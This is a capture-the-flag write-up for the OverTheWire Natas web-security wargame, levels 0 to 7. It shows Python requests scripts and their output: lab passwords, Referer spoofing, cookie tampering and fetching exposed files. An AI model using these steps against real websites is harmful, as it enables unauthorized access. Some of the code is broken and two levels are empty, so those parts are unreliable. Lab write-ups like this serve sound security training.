# Natas

https://overthewire.org/wargames/natas/

> Natas teaches the basics of serverside web-security.

> Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

> Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

> Start here:

> Username: natas0
> 
> Password: natas0
> 
> URL:      http://natas0.natas.labs.overthewire.org

## NatasX
```python
def natasX(x, pwd, endpoint="", headers={}):
    url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
    username = f"natas{x}"

    r = requests.get(url, auth=(username, pwd), headers=headers)

    print(r.text)
 ```

## Natas0
https://overthewire.org/wargames/natas/natas0.html

> Natas Level 0

> Username: natas0

> Password: natas0

> URL:      http://natas0.natas.labs.overthewire.org

```python
print(natasX.natasX(0,"natas0").text)
```

**Output**

```html
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
```

## Natas1
https://overthewire.org/wargames/natas/natas1.html

>Natas Level 0 → Level 1

>Username: natas1

>URL:      http://natas1.natas.labs.overthewire.org



```python
print(natasX.natasX(1,"gtVrDuiDfck831PqWsLEZy5gyDz1clto").text)
```

**Output**

```html
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
</div>
</body>
```

## Natas2
https://overthewire.org/wargames/natas/natas2.html

> Natas Level 1 → Level 2

> Username: natas2

> URL:      http://natas2.natas.labs.overthewire.org

```python
natas = natasX
# print(natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi").text)
print(natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi","files/users.txt").text)
```

**Output**

```text
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Natas3
https://overthewire.org/wargames/natas/natas3.html

> Natas Level 2 → Level 3

> Username: natas3

> URL:      http://natas3.natas.labs.overthewire.org

```python
natas = natasX

# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14").text)
# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/robots.txt").text)
# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/").text)
print(natas.natasX(3, "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/users.txt").text)
```


**Output**

```html
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Natas4
https://overthewire.org/wargames/natas/natas4.html

> Natas Level 3 → Level 4

> Username: natas4

> URL:      http://natas4.natas.labs.overthewire.org

```python
# print(natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ").text)
print(natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ", "", {'referer': "http://natas5.natas.labs.overthewire.org/"}).text)
```

**Output**

```html
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

## Natas5
https://overthewire.org/wargames/natas/natas5.html

> Natas Level 4 → Level 5

> Username: natas5

> URL:      http://natas5.natas.labs.overthewire.org

```python
print(natas.natasX(5, "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq", cookies={'loggedin': '1'}).text)
```

**Output**

```html
<div id="content">
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
</body>
```

## Natas6
https://overthewire.org/wargames/natas/natas6.html

> Natas Level 5 → Level 6

> Username: natas6

> URL:      http://natas6.natas.labs.overthewire.org

**Searchbox Source Code**
```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
```

```python
natas = natasX
# print(natas.natasX(6, "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1").text)
print(natas.natasX(6, "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1", endpoint="/includes/secret.inc").text)
# Enter "FOEIUWGHFEEUHOFUOIU" into the Searchbox it will result in 
```

**Output**

```html

```

## Natas7
https://overthewire.org/wargames/natas/natas7.html

> Natas Level 6 → Level 7

> Username: natas7

> URL:      http://natas7.natas.labs.overthewire.org

```python
```

**Output**

```html
```
